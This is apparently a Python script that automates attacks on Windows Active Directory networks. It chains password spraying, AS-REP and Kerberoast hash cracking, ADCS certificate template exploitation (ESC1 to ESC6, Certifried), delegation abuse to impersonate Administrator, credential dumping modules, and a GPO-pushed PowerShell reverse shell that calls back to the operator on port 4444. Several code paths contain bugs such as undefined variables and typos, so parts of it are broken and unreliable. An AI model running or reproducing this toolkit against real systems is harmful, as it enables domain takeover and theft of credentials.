import sys
import subprocess
import argparse
import re
from pathlib import Path
from typing import List, Set
import os
import socket
import shutil
import glob

USING_KERBEROS = False

DEFAULT_USERS = ["Administrator", "guest", "admin"]
DEFAULT_PASSWORD = ["", "administrator", "guest", "admin"]

def load_wordlist(filepath: str, is_password: bool = False) -> List[str]:
    """ Load and deduplicate entries from user/password wordlist"""
    if not Path(filepath).exists():
        print(f":{'Password' if is_password else 'User'} wordlist not found: {filepath}", file=sys.stderr)
        sys.exit(1)

    seen: Set[str] = set()
    items: List[str] = []
    empty_password_added = False
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()

            if is_password and line == "empty":
                if not empty_password_added:
                    items.append("")
                    empty_password_added= True
                continue
            
            if not line:
                continue
            if line not in seen:
                seen.add(line)
                items.append(line)
    return items

# Same as run_command just without a return
def run_comm(cmd: List[str], check: bool = False):
    """Run a command, don't return output """
    try:
        subprocess.run(cmd, text=True, check=check)
    except subprocess.CalledProcessError as e:
        output = e.stdout + e.stderr
        print(output)
    except Exception as e:
        print(f"Error running command: {e}")

def run_command(cmd: List[str], check: bool = False) -> str:
    """Run a command, return output """
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=check)
        output = result.stdout + result.stderr
        print(output)
        return output
    except subprocess.CalledProcessError as e:
        output = e.stdout + e.stderr
        print(output)
        return output
    except Exception as e:
        print(f"Error running command: {e}")
        return ""

def run_module_smb(name: str, module: str, ip: str, user: str, password: str, auth: str, *extra_args):
    """Run Netexec with SMB"""
    print(f"----- {name} -----")

    cmd = ["nxc", "smb", ip, "-M", module, "-u", user, auth, password]
    cmd.extend(extra_args)

    if USING_KERBEROS:
        cmd.append("-k")
    run_command(cmd)
    print()


def run_module_mssql(name: str, module: str, ip: str, user: str, password: str, auth: str, *extra_args):
    """Run Netexec with MSSQL"""
    print(f"----- {name} -----")

    cmd = ["nxc", "mssql", ip, "-M", module, "-u", user, auth, password]
    cmd.extend(extra_args)

    if USING_KERBEROS:
        cmd.append("-k")
    run_command(cmd)
    print()


def run_module_ldap(name: str, module: str, ip: str, user: str, password: str, auth:str,  *extra_args):
    """Run Netexec with LDAP"""
    print(f"----- {name} -----")

    cmd = ["nxc", "ldap", ip, "-M", module, "-u", user, auth, password]
    cmd.extend(extra_args)

    if USING_KERBEROS:
        cmd.append("-k")
    run_command(cmd)
    print()

def auth_was_successful(output: str) -> bool:
    if "[+]" in output:
        if "KRB_AP_ERR" in output:
            return False
        return True
    return False

def add_users_to_file(output, user_file="users.txt"):
    
    #rpc and nxc formats
    patterns = [r"User:\[([^\]]+)\]",r"SMB\s+\S+\s+\d+\s+\S+\s+([a-zA-Z0-9._-]+)\s{2,}"]

    blacklist = {"-Username-"}

    existing_users = set()
    if Path(user_file).exists():
        with open(user_file, "r", encoding="utf-8", errors="ignore") as f:
            existing_users = {line.strip() for line in f if line.strip()}

    found_users = set()
    for pattern in patterns:
        found_users.update(re.findall(pattern, output))

    with open(user_file, "a", encoding="utf-8") as f:
        for user in sorted(found_users):
            if user not in existing_users and user not in blacklist:
                f.write(user + "\n")
                existing_users.add(user)

def check_and_fix_hosts(ip, domain) ->bool:
    try:
        resolved_ip = socket.gethostbyname(domain)
        if resolved_ip == ip:
            return True
    except socket.error:
        pass
    try:
        with open("/etc/hosts", "a") as f:
            f.write(f"\n{ip}\t{domain}\n") 
        print("[+] Successfully updated /etc/hosts")
        return True
    except Exception as e:
        print(f"[-] Failed to write to /etc/hosts: {e}")
        return False

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def get_kerberos_ticket(domain, user, password, ip) -> bool:
    check_and_fix_hosts(ip, domain)

    cmd = ["getTGT.py", f"{domain}/{user}:{password}"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    output=result.stdout+ result.stderr
    print(output)

    if "Saving ticket in" in ouput:
        match = re.search(r"Saving ticket in ([^\s]+)", output)
        if match:
            ccache_path = os.path.abspath(match.group(1))
            os.environ["KRB5CCNAME"] = ccache_path
            print(f"[+] Ticket successfully retrieved: {ccache_path}")
            print(f"[+] KRB5CCNAME environment variable set.")
            return True
        if "SessionError" in output:
            print("[-] TGT Request failed (SessionError). Check credentials.")
            return False   
    print("[-] Failed to retrieve Kerberos ticket.")
    return False

def get_CA_name(output) -> str:
    ca_name = None
    lines = output.split('\n')
    for line in lines:
        if 'Certificate Authorities' in line and ':' in line:
            ca_name = line.split(':', 1)[1].strip()
    return ca_name

def get_vulnerable_templates(output) -> set:
    esc_list = set()
    lines = output.split('\n')
    in_vuln = False

    for line in lines:
        if '[!] Vulnerabilities' in line:
            in_vuln = True
            continue
        if in_vuln:
            if line.strip().startswith('[') and 'ESC' not in line:
                in_vulnerabilities = False
                continue
        esc_matches = re.findall(r'\bESC\d+\b', line)
        for esc in esc_matches:
            esc_list.add(esc)
    
    return esc_list

def get_pfx(output) -> str:
    lines = output.split('\n')
    for line in lines:
        if '[*] Saving certificate and private key to' in line:
            match = re.search(r"'([^']+\.pfx)'", line)
            if match:
                return match.group(1)
    return None

def exploit_adcs(domain, ip, user, password, target, esc=None):
    user_info = f"{user}@{domain}"
    admin_info = f"administrator@{domain}"
    certipy_info = subprocess.run(["certipy-ad", "find", "-u", user_info, "-p", password, "-dc-ip", ip, "-vulnerable", "-enabled"], capture_output=True, text=True)
    certipy_files = glob.glob("*_Certipy.txt")
    if certipy_files:
        latest_file = max(certipy_files, key=os.path.getctime)
        with open(latest_file, 'r') as f:
            output = f.read()
        CA_name = get_CA_name(output)
        templates = get_vulnerable_templates(output)
        print(f"[+] Vulnerable Templates {templates}")
    else:
        print("No Certipy output file found")
        sys.exit()
    
    if esc:
        templates = esc

    if "ESC1" in templates:
        print("[*] Running ESC1 Exploitation")
        result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "ESC1", "-ca", CA_name, "-upn", admin_info], capture_output=True, text=True)
        pfx = get_pfx(result.stdout)
        run_comm(["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", ip])
        sys.exit()
    if "ESC2" in templates:
        print("[*] Running ESC2 Explotation")
        user_result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "ESC2", "-ca", CA_name], capture_output=True, text=True)
        user_pfx = get_pfx(user_result.stdout)
        domain_name = domain.split('.')[0]
        admin = f"{domain_name}\administrator"
        admin_result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "User", "-ca", CA_name, "-on-behalf-of", admin, "-pfx", user_pfx], capture_output=True, text=True)
        admin_pfx = get_pfx(admin_result.stdout)
        run_comm(["certipy-ad", "auth", "-pfx", admin_pfx, "-dc-ip", ip])
        sys.exit()
    if "ESC3" in templates:
        print("[*] Running ESC3 Explotation")
        user_result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "ESC3-CRA", "-ca", CA_name], capture_output=True, text=True)
        user_pfx = get_pfx(user_result.stdout)
        domain_name = domain.split('.')[0]
        admin = f"{domain_name}\administrator"
        admin_result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "ESC3", "-ca", CA_name, "-on-behalf-of", admin, "-pfx", pfx], capture_output=True, text=True)
        admin_pfx = get_pfx(admin_result.stdout)
        run_comm(["certipy-ad", "auth", "-pfx", admin_pfx, "-dc-ip", ip])
        sys.exit()
    if "ESC4" in templates:
        print("[*] Running ESC4 Explotation")
        first_result = subprocess.run(["certipy-ad", "template", "-u", user_info, "-p", password, "-template", "ESC4", "-save-old", "-debug"], capture_output=True, text=True)
        result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "ESC4", "-ca", CA_name, "-upn", admin_info], capture_output=True, text=True)
        pfx = get_pfx(result.stdout)
        run_comm(["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", ip])
        sys.exit()
    if "ESC6" in templates:
        result = subprocess.run(["certipy-ad", "req", "-u", user_info, "-p", password, "-target", target, "-template", "User", "-ca", CA_name, "-upn", admin_info], capture_output=True, text=True)
        pfx = get_pfx(result.stdout)
        run_comm(["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", ip])
        sys.exit()
    if "certifried" in templates:
        result = subprocess.run(["certipy-ad", "account", "create", "-u", user_info, "-p", password, "-user", "certifriedpc", "-pass", "certifriedpass"])
        MA_info = f"certifriedpc$@{domain}"
        result = subprocess.run(["certipy-ad", "req", "-u", MA_info, "-p", certifriedpass, "-target", target,"-ca", CA_name,  "-template", "Machine"], capture_output=True, text=True)
        pfx = get_pfx(result.stdout)
        domain_name = domain.split('.')[0]
        domain_user = f"{domain_user}$"
        run_comm(["certipy", "auth", "-pfx", pfx, "-username", domain_user, "-domain", domain, "-dc-ip", ip])
        sys.exit()
    print("[-] No vulnerabilities found")
    
    

def main():
    global USING_KERBEROS

    parser = argparse.ArgumentParser(description="Automate all of Windows so we dont have to do anything")

    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("protocol", nargs="?", default="", help="Protocol used within NetExec")
    parser.add_argument("-domain", "-d", help="Target Domain Name")
    parser.add_argument("-dc", help = "Domain Controler")
    parser.add_argument("-target", "-target_machine", help = "User/Machine we going after")
    parser.add_argument("-user_list", "-user-list", default="", help="Optional user wordlist")
    parser.add_argument("-password_list", "-password-list", default="", help="Optional password list")
    parser.add_argument("-user", "-u", help="Target User")
    parser.add_argument("-password", "-p", help="Target Password")
    parser.add_argument("-hash", "-H", help="Target Hash")
    parser.add_argument("-kerberos", "-k", action="store_true", help="Use Kerberos authentication")
    parser.add_argument("-roast", "-r", action="store_true", help="Run [ASP-Rep/Kerbe]roast attacks")
    parser.add_argument("-extras", "-e", action="store_true", help ="Run all modules including things we never seeing")
    parser.add_argument("-mssql", "-sql", action="store_true", help ="Run MSSQL modules")
    parser.add_argument("-findusers", action="store_true", help = 'Brute force valid users with NMAP')
    parser.add_argument("-enum", action="store_true", help = "Runs enum4Linux to get sysinfo")
    parser.add_argument("-scan", action="store_true", help ="Scans subnet for active machines with NetExec")
    parser.add_argument("-userscan", action="store_true", help = "Gets Users")
    parser.add_argument("-passwd", action="store_true", help="Get Password Policy")
    parser.add_argument("-rpc", action="store_true", help = "Try anonymous rpc and if successful enumerate")
    parser.add_argument("-shares", action="store_true", help="Enumerate SMB Shares")
    parser.add_argument("-getusers", "-get-users", action="store_true", help="Gets all users and outputs to file for easier password spraying")
    parser.add_argument("-ldapsearch", "-ldap", action="store_true", help = "Enumerate users in LDAP")
    parser.add_argument("-bloodhound", action="store_true", help = "Run Bloodhound")
    parser.add_argument("-findDelegation", "-delegation", action="store_true", help="Find Delegations for abuse")
    parser.add_argument("-rbcd", action="store_true", help="Run Resourced Based Constrained Delegation")
    parser.add_argument("-clean", action="store_true", help = "Clean up after RBCD exploit")
    parser.add_argument("-gpoabuse", "-gpo", action="store_true", help="Run GPO Abuse")
    parser.add_argument("-gpoID", help = "ID of the GPO needed for gpoabuse")
    parser.add_argument("-adcs", action="store_true", help="Find vulnerabilities in ADCS and abuse them")
    parser.add_argument("-esc", help="Specify the exact ESC priv esc you want to run")

    args = parser.parse_args()
    ip = args.ip
    protocol=args.protocol
    domain = args.domain
    dc = args.dc
    target = args.target
    USING_KERBEROS = args.kerberos
    auth = ""
    if args.scan:
        if args.userscan:
            run_comm(["nxc", protocol, ip, "--users"])           
        else:
            run_comm(["nxc", protocol, ip])
        if args.passwd:
            run_comm(["nxc", protocol, ip, "--pass-pol"])
        sys.exit()

    if args.user:
        user = args.user
    if args.password:
        password=args.password
        auth = "-p"
    if args.hash:
        auth = "-H"
        password = args.hash

    if args.enum:
        if args.user:
            run_comm(["enum4linux", ip, "-u", user, auth, password ]) 
        else:
            run_comm(["enum4linux", ip])
        sys.exit() 

    if args.getusers:
        find_users = subprocess.run(["nxc", "smb", ip, "-u", args.user, auth, args.password, "--users"], capture_output=True, text=True)
        add_users_to_file(find_users.stdout)
        print("[+] Wrote Users to users.txt")
        sys.exit()

    if args.bloodhound:
        run_comm(["bloodhound-ce-python", "--zip", "-c", "All", "-d", domain, "-u", user, "-p", password, "-ns", ip])
        print("Use this for cyphers: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/")
        sys.exit()

    if args.rpc:
        try:
            run_comm(["rpcclient", "-U", "", ip, "-N", "-c", "enumdomgroups"])
            print("-"*32)
            rpc_users = subprocess.run(["rpcclient", "-U", "", ip, "-N", "-c", "enumdomusers"], capture_output=True, text=True)
            add_users_to_file(rpc_users.stdout)

            user_pattern = r"user:\[([^\]]+)\] rid:\[(0x[0-9a-fA-F]+)\]"
            user_matches = re.findall(user_pattern, rpc_users.stdout)
            for username, rid in user_matches:
                rpc_command = f"queryuser {rid}"
                user_details = subprocess.run(["rpcclient", "-U", "", ip, "-N", "-c", rpc_command], capture_output=True, text=True)

                description = ""
                desc_match = re.search(r"Description\s*:\s*(.+)", user_details.stdout)
                if desc_match:
                    description = desc_match.group(1).strip()
                print(f"User:[{username}] RID:[{rid}] Description:[{description}]")
        except Exception as e:
            print(f"Error anonymous RPC bind not enabled: {e}")
        sys.exit()

    if args.findDelegation:
        domain_user = f"{domain}/{user}:{password}"
        run_comm(["findDelegation.py", domain_user, "-target-domain", domain])
        sys.exit()

    if args.rbcd:
        user_info = f"{domain}/{user}:{password}"
        if args.clean:
            run_comm(["rbcd.py", "-delegate-from", "rbcd$", "-delegate-to", target, "-dc-ip", dc, "-action", "flush", user_info])
            run_comm(["addcomputer.py", "-computer-name", "rbcd$", "-computer-pass", "rbcdpass", "-dc-host", dc, user_info, "-delete"])
            sys.exit()

        http_info = f"HTTP/{dc}"
        run_comm(["addcomputer.py", "-computer-name", "rbcd$", "-computer-pass", "rbcdpass", "-dc-host", dc, user_info])
        run_comm(["rbcd.py", "-delegate-from", "rbcd$", "-delegate-to", target, "-dc-ip", dc, "-action", "write", user_info])
        rbcd_info = f"{domain}/rbcd$:rbcdpass"
        cmd = ["getST.py", "-spn", http_info, "-impersonate", "Administrator", "-dc-ip", dc, rbcd_info]
        print(cmd)
        run_comm(["getST.py", "-spn", http_info, "-impersonate", "Administrator", "-dc-ip", dc, rbcd_info])
        ccache = f"Administrator@HTTP_{dc}@{domain.upper()}.ccache"
        os.environ["KRB5CCNAME"] = ccache

        run_comm(["evil-winrm", "-i", dc, "-r", domain.upper()])
        sys.exit()
    
    if args.user:
        users = [args.user]
    elif args.user_list:
        users = load_wordlist(args.user_list, is_password=False)
    else:
        users = DEFAULT_USERS.copy()

    if args.password:
        passwords = [args.password]
    elif args.hash:
        passwords = [args.hash]
    elif args.password_list:
        passwords = load_wordlist(args.password_list, is_password=True)
    else:
        passwords = DEFAULT_PASSWORD.copy()
    
    if args.ldapsearch:
        base_dn = "DC=" + ",DC=".join(args.domain.split("."))
        if args.user and args.password:
            ldap_cmd = ["ldapsearch", "-H", f"ldap://{ip}", "-D", f"{args.user}@{args.domain}", "-w", args.password, "-b", base_dn, "(&(objectCategory=person)(objectClass=user))"]
        else:
            print("[*] Trying anonymous LDAP bind")
            ldap_cmd = [ "ldapsearch", "-H", f"ldap://{ip}", "-x", "-b", base_dn, "(&(objectCategory=person)(objectClass=user))"]

        ldap_output = subprocess.run(ldap_cmd, capture_output=True,text=True)

        if ldap_output.returncode != 0:
            print("[-] LDAP query failed")
            print(ldap_output.stderr.strip())
            sys.exit(1)

        current_dn = ""
        current_name = ""
        current_desc = ""
        current_pass = ""

        for line in ldap_output.stdout.splitlines():
            line = line.strip()

            if line == "":
                if current_name:
                    print(f"User: {current_name} | Description: {current_desc} | userPassword: {current_pass}")
                current_dn = ""
                current_name = ""
                current_desc = ""
                current_pass = ""
                continue

            if line.lower().startswith("dn:"):
                current_dn = line.split(":", 1)[1].strip()

            elif line.lower().startswith("cn:"):
                current_name = line.split(":", 1)[1].strip()

            elif line.lower().startswith("description:"):
                current_desc = line.split(":", 1)[1].strip()

            elif line.lower().startswith("userpassword:"):
                current_pass = line.split(":", 1)[1].strip()

        if current_name:
            print(f"User: {current_name} | Description: {current_desc} | userPassword: {current_pass}")
        sys.exit()
     
    if args.findusers:
        if not domain or not args.user_list:
            print("[-] -findusers requires -domain and a user_list file", file=sys.stderr)
            sys.exit(1)

        run_command(["nmap","-p", "88","--script=krb5-enum-users",f"--script-args=krb5-enum-users.realm={domain},userdb={args.user_list}", ip])
        sys.exit()

    if args.adcs:
        esc = args.esc
        if esc:
            exploit_adcs(domain, ip, user, password, target, esc)
        else:
            exploit_adcs(domain, ip, user, password, target, esc=None)
        sys.exit()
        
    if args.shares:
        if args.user and args.password:
            run_comm(["nxc", "smb", ip,  "-u", user, "-p", password, "--shares"])
        else:
            run_comm(["nxc", "smb", ip,  "-u", "andygu", "-p", "", "--shares"])
        sys.exit()

    if args.roast:
        print(" ----- Running Roast Attacks ------")
        asrep = "asrephash.txt"
        kerberoast_file="kbhash.txt"
        timeroast="trhash.txt"
        found_creds = []
        
        nxc_output = run_command(["nxc", "ldap", ip, "-u", args.user_list, "-p", "", "--asreproast", asrep])
        asrep_hashes = re.findall(r'(\$krb5asrep\$[^\s]+)', nxc_output)
        if asrep_hashes:
            with open(asrep, 'w') as f:
                f.write('\n'.join(asrep_hashes) + '\n')
            print(f"\n[+] Found {len(asrep_hashes)} AS-REP roastable account(s), running hashcat...")
            hashcat_result = subprocess.run(["hashcat", "-m", "18200", asrep, "/usr/share/wordlists/rockyou.txt"],capture_output=True,text=True)
            for line in hashcat_result.stdout.split('\n'):
                match = re.search(r'\$krb5asrep\$23\$([^@]+)@[^:]+:[^:]+:(.+)$', line)
                if match:
                    username = match.group(1)
                    password = match.group(2).strip()
                    found_creds.append((username, password))
                    print(f"[!] Cracked: {username}:{password}")
                    run_comm(["nxc", "smb", ip, "-u", username, "-p", password])
            if not found_creds:
                print("[-] No credentials cracked")
        else:
            print("\n[-] No AS-REP roastable accounts found")

        if found_creds or (args.user and args.password):
            if found_creds:
                for user, password in found_creds:
                    print(f"\n[*] Trying Kerberoasting with {user}:{password}")
                    subprocess.run(["nxc", "ldap", ip, "-u", user, "-p", password, "--kerberoasting", kerberoast_file], stderr=subprocess.DEVNULL)
            else:
                print(f"\n[*] Using provided credentials for Kerberoasting")
                subprocess.run(["nxc", "ldap", ip, "-u", args.user, "-p", args.password, "--kerberoasting", kerberoast_file], stderr=subprocess.DEVNULL)
            
            kerb_hashes = {}
            if Path(kerberoast_file).exists():
                with open(kerberoast_file, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        if "$krb5tgs$" in line:
                            username_match = re.search(r'\$krb5tgs\$23\$\*([^\$]+)\$', line)
                            if username_match:
                                username = username_match.group(1)
                                kerb_hashes[username] = line.strip() 
            if kerb_hashes:  
                clean_kerb = "kerberoast_clean.txt"
                with open(clean_kerb, "w", encoding="utf-8") as f:
                    f.write("\n".join(kerb_hashes.values()) + "\n")
                
                print(f"\n[+] Found {len(kerb_hashes)} unique Kerberoastable account(s), running hashcat [This may take a while...]")
                
                hashcat_result = subprocess.run(["hashcat", "-m", "13100", clean_kerb, "/usr/share/wordlists/rockyou.txt", "--force"], capture_output=True, text=True)
                
                kerb_cracked = []
                for line in hashcat_result.stdout.split('\n'):
                    match = re.search(r'\$krb5tgs\$23\$\*([^\$]+)\$[^\$]+\$[^\*]+\*[^:]+:(.+)$', line)
                    if match:
                        username = match.group(1)
                        password = match.group(2).strip()
                        kerb_cracked.append((username, password))
                        print(f"\n[!] Cracked Kerberoast: {username}:{password}")
                        run_comm(["nxc", "smb", ip, "-u", username, "-p", password])
                
                if not kerb_cracked:
                    print("\n[-] No Kerberoast credentials cracked")
            else:  
                print("\n[-] No Kerberoastable SPNs found")
        else:
            print("\n[-] No credentials available for Kerberoasting")

        if (args.user and args.password):
            print(f"\n[*] Using provided credentials for Timeroasting")
            with open(timeroast, "w") as file:
                subprocess.run(["nxc", "smb", ip, "-u", user, "-p", password, "-M", "timeroast"], stdout=file)
                subprocess.call(["cat trhash.txt | awk '{print $5}' | sed -n '4p' > trhashclean.txt"], shell=True)
                subprocess.call(["cut -d':' -f2- trhashclean.txt > trhashclean1.txt"], shell=True)
                if Path("trhashclean1.txt").exists() and Path("trhashclean1.txt").stat().st_size > 0:
                    print("\n\n[+] Timeroast hash found, running hashcat...")
                    subprocess.run(["hashcat", "-m", "31300", "trhashclean1.txt", "/usr/share/wordlists/rockyou.txt"])
                else:
                    print("\n[-] No timeroast hashes found")
        sys.exit()

    if args.gpoabuse:
        gpo_id = args.gpoID
        domain_info = f"{domain}/{args.user}:{args.password}"
        my_ip = get_ip()
        cmd = (
        f"$c = New-Object System.Net.Sockets.TCPClient('{my_ip}',4444);"
        "$s = $c.GetStream();"
        "[byte[]]$b = 0..65535|%{0};"
        "while(($i = $s.Read($b, 0, $b.Length)) -ne 0){"
        "    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "    $sb = (iex $d 2>&1 | Out-String );"
        "    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');"
        "    $s.Write($sb,0,$sb.Length);"
        "    $s.Flush()"
        "};"
        "$c.Close()"
    )
        try:
            run_comm(["python3", "pygpoabuse.py", domain_info, "-gpo-id", gpo_id, "-powershell", "-command", cmd, "-taskname", "MyTask", "-description", "Testing Task created by authorized penetration testing team"])
            print("[*] Reverse shell task placed. Start listener on 4444!")
        except Exception as e:
            print(f"[-] Error try getting pygoabuse.py before running: git clone https://github.com/Hackndo/pyGPOAbuse.git {e}")
        sys.exit()

    print(f"Trying IP: {ip}")
    print("-"*23)
    print(f"Trying users: {', '.join(users)}")
    print(f"With Passwords: {', '.join(passwords)}")
    print()

    if USING_KERBEROS:
        print("------ Using Kerberos Authentication ------")
        success = get_kerberos_ticket(domain, user, password, ip)
        if success:
            print(f"✓ Ticket Acquired. Running checks with Kerberos...")
        else:
            print("[-] Failed to get ticket. Attempting standard NTLM check first...")

    for user in users:
        for password in passwords:
            print("=" * 23)
            print(f"Trying User: {user}")
            print(f"Password: {password}")
            print("=" * 23)

            auth_output = run_command(["nxc", "smb", ip, "-u", user, auth, password])

            if not auth_was_successful(auth_output):
                print(f"Authentication failed for {user}:{password}, trying next password")
                print()
                continue

            print(f"✓ Authentication succeeded! Running all checks with {user}:{password}")
            print()

            print("=" * 23)
            print("basic Testing: msql, winrm, ldap, lsa, sccm")
            print("=" * 23)

            run_command(["nxc", "mssql", ip, "-u", user, auth, password] + (["-k"] if USING_KERBEROS else []))
            run_command(["nxc", "winrm", ip, "-u", user, auth, password] + (["-k"] if USING_KERBEROS else []))
            run_command(["nxc", "ldap", ip, "-u", user, auth, password] + (["-k"] if USING_KERBEROS else []))
            run_command(["nxc", "smb", ip, "-u", user, auth, password, "--lsa"] + (["-k"] if USING_KERBEROS else []))
            run_command(["nxc", "ldap", ip, "-u", user, auth, password, "--gmsa"] + (["-k"] if USING_KERBEROS else []))

            
            find_users = subprocess.run(["nxc", "smb", ip, "-u", user, auth, password, "--users"], capture_output=True, text=True)
            add_users_to_file(find_users.stdout)

            #Run NetExec Exploit modules
            run_module_smb("MS17-010 (EternalBlue)", "ms17-010", ip, user, password, auth)
            run_module_smb("Printnightmare", "printnightmare", ip, user, password, auth)
            run_module_smb( "NoPac", "nopac" , ip, user, password, auth)
            run_module_smb("Backup Operator (Dump NTDS)", "backup_operator", ip, user, password, auth)
            run_module_smb("DPAPI Hash Dump", "dpapi_hash", ip, user, password, "dpapi_Output.txt", auth)
            run_module_ldap("User Descriptions", "get-desc-users", ip, user, password, auth)
            run_module_ldap("Info Fields", "get-info-users", ip, user, password, auth)
            run_module_ldap("LDAP User Password", "get-userPassword", ip, user, password, auth)
            run_module_ldap("Certipy Vuln Templates", "certipy-find", ip, user, password, auth)
            run_module_smb("Autologin Information", "gpp_autologin", ip, user, password, auth)
            run_module_smb("Impersonate Tokens", "impersonate", ip, user, password, auth)
            run_module_smb("Extract Creds from Windows Logs", "eventlog_creds", ip, user, password, auth)
            run_module_smb("LSASSY", "lsassy", ip, user, password, auth)
            run_module_ldap("LAPS", "laps", ip, user, password, auth)
            run_module_smb("PowerShell History", "powershell_history", ip, user, password, auth)            
            run_module_smb("RDCman Dump", "rdcman", ip, user, password, auth)            
            run_module_smb("Loot VNC", "vnc", ip, user, password, auth)
            run_module_smb("ZeroLogon", "zerologon", ip, user, password, auth)

            print(" ------ Informational ------")
            run_module_smb("Bitlocker Enanbled", "bitlocker", ip, user, password, auth)
            run_module_smb("Enumerate AV", "enum_av", ip, user, password, auth)
            run_module_smb("Check UAC Status", "uac", ip, user, password, auth)

            #Desperate times
            if args.extras:
                run_module_smb("SMB Ghost", "smbghost", ip, user, password, auth)
                run_module_smb("KeePass", "keepass_discover", ip, user, password, auth)
                run_module_smb("Putty Private Keys", "putty", ip, user, password, auth)

            if args.mssql:
                run_module_mssql("Enumerate Users with Impersonation Privileges", "enum_impersonate", ip, user, password, auth)
                run_module_mssql("Enumerate Linked SQL Servers", "enum_links", ip, user, password, auth)
                run_module_mssql("Enumerate SQL Server Logins", "enum_logins", ip, user, password, auth)

            

            print()
    print("Done.")

if __name__ == "__main__":
    main()
